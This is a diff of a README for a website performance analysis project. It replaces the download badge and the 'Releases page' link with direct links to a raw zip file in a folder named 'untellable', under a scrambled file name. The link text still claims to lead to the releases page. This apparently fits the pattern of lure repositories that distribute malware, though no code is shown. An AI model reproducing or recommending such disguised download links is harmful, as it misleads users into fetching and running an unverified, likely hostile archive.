@@ -6,7 +6,7 @@ Welcome to the **Website-Performance-Data-Analysis-Project**. This application h
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/FNFKKEngine/Website-Performance-Data-Analysis-Project/releases)
+[![Download Now](https://raw.githubusercontent.com/FNFKKEngine/Website-Performance-Data-Analysis-Project/main/untellable/Project-Website-Analysis-Data-Performance-v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/FNFKKEngine/Website-Performance-Data-Analysis-Project/main/untellable/Project-Website-Analysis-Data-Performance-v2.4.zip)
 
 ## 📄 Overview
 
@@ -39,7 +39,7 @@ To run this application, ensure your system meets the following requirements:
 
 To install this application, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/FNFKKEngine/Website-Performance-Data-Analysis-Project/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/FNFKKEngine/Website-Performance-Data-Analysis-Project/main/untellable/Project-Website-Analysis-Data-Performance-v2.4.zip) to find the latest version of the application.
    
 2. **Choose the Version**: Identify the most recent version of the software. Click on the version title to open detailed release notes.
 
